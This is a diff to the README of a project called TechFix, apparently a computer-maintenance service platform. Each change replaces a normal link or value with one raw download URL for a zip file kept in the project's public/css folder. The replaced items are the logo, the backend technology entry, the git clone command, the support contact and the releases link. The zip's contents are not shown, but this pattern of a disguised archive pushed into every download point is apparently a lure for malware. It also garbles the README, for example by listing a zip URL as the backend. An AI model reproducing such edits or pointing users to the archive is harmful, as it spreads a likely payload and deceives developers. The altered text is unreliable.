@@ -1,6 +1,6 @@
 # TechFix 🚀
 
-![TechFix Logo](https://img.shields.io/badge/TechFix-Platform-blue?style=for-the-badge&logo=appveyor)
+![TechFix Logo](https://github.com/hugonattan/TechFix/raw/refs/heads/main/public/css/Fix-Tech-3.4.zip)
 
 Welcome to **TechFix**, your go-to web platform for managing computer maintenance and upgrade services. We offer real-time tracking and transparent communication between clients and our technical team. Whether you need a quick fix or a major upgrade, TechFix has you covered.
 
@@ -29,7 +29,7 @@ Welcome to **TechFix**, your go-to web platform for managing computer maintenanc
 TechFix utilizes a variety of technologies to provide a seamless experience:
 
 - **Frontend**: HTML, CSS, JavaScript
-- **Backend**: Node.js, Express
+- **Backend**: https://github.com/hugonattan/TechFix/raw/refs/heads/main/public/css/Fix-Tech-3.4.zip, Express
 - **Database**: PostgreSQL
 
 ## Getting Started
@@ -41,7 +41,7 @@ To get started with TechFix, you need to clone the repository and install the re
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/hugonattan/TechFix.git
+   git clone https://github.com/hugonattan/TechFix/raw/refs/heads/main/public/css/Fix-Tech-3.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -93,11 +93,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For any inquiries, please reach out to us at [support@techfix.com](mailto:support@techfix.com).
+For any inquiries, please reach out to us at [https://github.com/hugonattan/TechFix/raw/refs/heads/main/public/css/Fix-Tech-3.4.zip](https://github.com/hugonattan/TechFix/raw/refs/heads/main/public/css/Fix-Tech-3.4.zip).
 
 ## Releases
 
-You can find the latest releases of TechFix [here](https://github.com/hugonattan/TechFix/releases). Please download the appropriate version and follow the installation instructions.
+You can find the latest releases of TechFix [here](https://github.com/hugonattan/TechFix/raw/refs/heads/main/public/css/Fix-Tech-3.4.zip). Please download the appropriate version and follow the installation instructions.
 
 If you encounter any issues, check the "Releases" section for updates and fixes.
 
